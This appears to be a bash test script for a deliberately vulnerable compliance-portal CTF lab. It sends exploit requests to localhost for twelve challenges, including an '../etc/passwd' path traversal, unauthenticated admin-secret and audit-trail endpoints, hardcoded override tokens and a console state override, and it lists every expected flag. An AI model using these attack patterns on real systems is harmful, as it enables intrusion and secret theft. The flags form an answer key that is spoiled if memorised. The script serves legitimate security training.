#!/bin/bash

# DVTC CTF Challenge Test Script
# This script tests all 12 CTF challenges to ensure they work correctly

API_URL="http://localhost:8000"
LOCALSTACK_URL="http://localhost:4566"

echo "================================================"
echo "DVTC CTF Challenge Testing Script v0.1"
echo "================================================"
echo ""

# Color codes for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0;33m' # No Color

# Track found flags
FOUND_FLAGS=0
TOTAL_FLAGS=12

# Function to test a challenge
test_challenge() {
    local flag_num=$1
    local flag_name=$2
    local command=$3
    local expected_flag=$4

    echo -e "${YELLOW}Testing FLAG$flag_num: $flag_name${NC}"

    # Execute the command and capture output
    output=$(eval "$command" 2>/dev/null)

    # Check if flag was found
    if echo "$output" | grep -q "$expected_flag"; then
        echo -e "${GREEN}✓ SUCCESS: Found $expected_flag${NC}"
        ((FOUND_FLAGS++))
    else
        echo -e "${RED}✗ FAILED: Flag not found${NC}"
        echo "  Command: $command"
        echo "  Output: $(echo "$output" | head -2)"
    fi
    echo ""
}

echo "Starting CTF challenge tests..."
echo ""

# FLAG01: Leaky Presigned URL (100 pts)
test_challenge "01" "Leaky Presigned URL" \
    "curl -s '$API_URL/api/reports/presigned?file=internal-soc2-plan.pdf&expiry=86400' | jq -r '.flag'" \
    "flag{presigned_url_forever}"

# FLAG02: Secrets Manager Loot (200 pts)
test_challenge "02" "Secrets Manager Loot" \
    "curl -s '$API_URL/api/admin/secrets/okta_api_token' | jq -r '.flag'" \
    "flag{too_much_power}"

# FLAG03: Template Traversal (200 pts)
test_challenge "03" "Template Traversal" \
    "curl -s -X POST '$API_URL/api/reports/generate?template=../etc/passwd' | jq -r '.flag'" \
    "flag{template_traversal}"

# FLAG04: Machine-Readable Overshare (150 pts)
test_challenge "04" "Machine-Readable Overshare" \
    "curl -s '$API_URL/api/feeds/compliance.json' | jq -r '._metadata.flag'" \
    "flag{json_bits_betray}"

# FLAG05: Badge Falsification (150 pts)
echo -e "${YELLOW}Testing FLAG05: Badge Falsification${NC}"
echo "  Note: This challenge requires browser console interaction"
echo "  Manual test: Open http://localhost:3000/trust and run:"
echo "  window.__BADGES_OVERRIDE = {fips_encryption: 'ok'}"
echo "  Expected flag: flag{ui_state_is_not_security}"
echo ""

# FLAG06: CI/CD From Forks (250 pts)
test_challenge "06" "CI/CD From Forks" \
    "grep -r 'flag{forklift_deploy}' .github/workflows/vulnerable.yml" \
    "flag{forklift_deploy}"

# FLAG07: Admin Trail For All (200 pts)
test_challenge "07" "Admin Trail For All" \
    "curl -s '$API_URL/api/admin/downloadAuditTrail' | jq -r '.events[] | select(.details.flag) | .details.flag' | head -1" \
    "flag{who_needs_auth}"

# FLAG08: Chatbot Prompt Injection (200 pts)
test_challenge "08" "Chatbot Prompt Injection" \
    "curl -s '$API_URL/api/ai/context?reveal=true' | jq -r '.flag'" \
    "flag{llm_context_leaked}"

# FLAG09: Stale Fork Secrets (150 pts)
test_challenge "09" "Stale Fork Secrets" \
    "curl -s '$API_URL/api/reports/deleted/.env.backup' | jq -r '.flag'" \
    "flag{internet_never_forgets}"

# FLAG10: Compliance Override (300 pts)
test_challenge "10" "Compliance Override" \
    "curl -s -X POST '$API_URL/api/admin/force-compliance?framework=soc2&status=passed&token=compliance_override_2024' | jq -r '.flag'" \
    "flag{compliance_by_css}"

# FLAG11: Debug Mode Exposed (100 pts)
test_challenge "11" "Debug Mode Exposed" \
    "curl -s '$API_URL/api/debug' | jq -r '.debug_info.flag'" \
    "flag{debug_in_prod}"

# FLAG12: Weak Session Tokens (150 pts)
test_challenge "12" "Weak Session Tokens" \
    "curl -s '$API_URL/api/admin/session' -H 'X-Admin-Token: admin_override_token_2024' | jq -r '.flag'" \
    "flag{md5_sessions_bad}"

echo "================================================"
echo "Test Results Summary"
echo "================================================"
echo -e "Automatically tested: ${GREEN}$FOUND_FLAGS${NC} / $((TOTAL_FLAGS - 1)) challenges"
echo -e "Manual verification needed: ${YELLOW}1${NC} challenge (FLAG05 - requires browser)"
echo ""

if [ $FOUND_FLAGS -eq $((TOTAL_FLAGS - 1)) ]; then
    echo -e "${GREEN}✓ All automated tests passed!${NC}"
else
    echo -e "${RED}✗ Some tests failed. Check output above for details.${NC}"
fi

echo ""
echo "================================================"
echo "Additional Manual Tests Recommended:"
echo "================================================"
echo ""
echo "1. Visit http://localhost:3000/ctf to test the CTF UI"
echo "2. Submit each flag through the web interface"
echo "3. Verify all hints are helpful and accurate"
echo "4. Check that progress tracking works in browser"
echo "5. Test FLAG05 in browser console:"
echo "   - Open http://localhost:3000/trust"
echo "   - Press F12 for DevTools"
echo "   - Run: window.__BADGES_OVERRIDE = {fips_encryption: 'ok'}"
echo "   - Verify toast notification with flag appears"
echo ""

# Test the flag submission endpoint
echo "Testing flag submission endpoint..."
response=$(curl -s -X POST "$API_URL/api/flags/submit" \
    -H "Content-Type: application/json" \
    -d '{"flag_id": "FLAG04", "flag_value": "flag{json_bits_betray}", "team_name": "test_team"}' 2>/dev/null)

if echo "$response" | grep -q "success"; then
    echo -e "${GREEN}✓ Flag submission endpoint working${NC}"
else
    echo -e "${RED}✗ Flag submission endpoint not working${NC}"
    echo "  Response: $response"
fi

echo ""
echo "Test script completed!"
echo ""
echo "For complete solutions, see SOLUTIONS.md"
echo "For future enhancements, see ROADMAP.md"
